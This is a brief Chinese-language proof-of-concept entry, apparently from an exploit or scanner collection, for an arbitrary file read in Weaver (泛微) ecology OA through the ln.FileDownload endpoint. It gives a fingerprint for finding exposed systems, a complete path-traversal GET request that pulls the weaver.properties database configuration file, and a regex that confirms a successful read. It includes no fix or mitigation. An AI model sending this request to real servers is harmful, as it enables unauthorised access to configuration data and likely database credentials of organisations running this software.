# 泛微-ecology-任意文件读取-ln.FileDownload

泛微OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1`
- **响应特征**：200 ^(?=.*?DatabaseName)(?=.*?ecology.maxconn).*?$